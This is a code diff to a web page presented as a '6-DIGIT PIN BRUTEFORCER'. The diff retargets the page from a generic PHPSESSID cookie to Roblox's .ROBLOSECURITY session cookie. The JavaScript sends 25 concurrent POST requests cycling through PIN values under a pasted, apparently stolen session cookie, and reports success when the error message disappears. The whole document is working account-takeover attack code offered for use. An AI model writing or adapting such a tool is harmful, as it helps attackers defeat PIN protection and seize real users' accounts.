@@ -16,7 +16,7 @@
 
 <div class="panel">
     <h2>[ 6-DIGIT PIN BRUTEFORCER ]</h2>
-    <input type="text" id="cookieData" placeholder="PASTE SESSION COOKIE VALUE HERE">
+    <input type="text" id="cookieData" placeholder="PASTE .ROBLOSECURITY COOKIE HERE">
     <button id="actionBtn" onclick="executeAttack()">START PROCESS</button>
     <div id="console">[*] System ready. Awaiting session cookie...</div>
 </div>
@@ -47,14 +47,14 @@ async function attemptPin(currentPin, targetCookie) {
             method: "POST",
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": `PHPSESSID=${targetCookie}` // Change PHPSESSID if your target application uses a different cookie name
+                // Updated to use the explicit .ROBLOSECURITY format structure
+                "Cookie": `.ROBLOSECURITY=${targetCookie}` 
             },
             body: `${FIELD_NAME}=${paddedPin}`
         });
 
         const htmlResponse = await req.text();
         
-        // If the error message disappears from the web page, the correct PIN was hit
         if (!htmlResponse.includes(ERROR_MSG)) {
             return { success: true, pin: paddedPin };
         }
@@ -68,13 +68,13 @@ async function executeAttack() {
     const sessionToken = document.getElementById('cookieData').value.trim();
     
     if (!sessionToken) {
-        alert("Error: You must provide a session cookie value!");
+        alert("Error: You must provide a cookie value!");
         return;
     }
 
     processing = true;
     document.getElementById('actionBtn').disabled = true;
-    document.getElementById('console').innerText = "[*] Validating cookie configuration...\n[*] Spawning parallel attack threads...\n";
+    document.getElementById('console').innerText = "[*] Validating cookie format...\n[*] Spawning parallel attack threads...\n";
 
     const concurrentLimit = 25; 
     
